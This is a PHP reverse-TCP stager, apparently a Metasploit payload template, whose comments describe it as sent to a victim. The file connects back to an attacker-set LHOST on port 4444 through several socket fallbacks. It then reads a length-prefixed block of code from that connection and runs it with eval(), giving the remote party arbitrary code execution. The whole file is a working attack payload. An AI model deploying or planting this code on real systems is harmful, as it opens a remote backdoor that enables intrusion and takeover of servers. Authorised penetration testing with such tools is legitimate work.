#<?php

# The payload handler overwrites this with the correct LHOST before sending
# it to the victim.
$ipaddr = '127.0.0.1';
$port = 4444;
if (FALSE !== strpos($ipaddr, ":")) {
	# ipv6 requires brackets around the address
	$ipaddr = "[". $ipaddr ."]";
}
if (is_callable('stream_socket_client')) {
	$msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");
	if (!$msgsock) { die(); }
	$msgsock_type = 'stream';
} elseif (is_callable('fsockopen')) {
	$msgsock = fsockopen($ipaddr,$port);
	if (!$msgsock) { die(); }
	$msgsock_type = 'stream';
} elseif (is_callable('socket_create')) {
	$msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	$res = socket_connect($msgsock, $ipaddr, $port);
	if (!$res) { die(); }
	$msgsock_type = 'socket';
} else {
	die();
}

switch ($msgsock_type) { 
case 'stream': $len = fread($msgsock, 4); break;
case 'socket': $len = socket_read($msgsock, 4); break;
}
if (!$len) {
	# We failed on the main socket.  There's no way to continue, so
	# bail
	die();
}
$a = unpack("Nlen", $len);
$len = $a['len'];

$buffer = '';
while (strlen($buffer) < $len) {
	switch ($msgsock_type) { 
	case 'stream': $buffer .= fread($msgsock, $len-strlen($buffer)); break;
	case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer)); break;
	}
}

eval($buffer);
die();
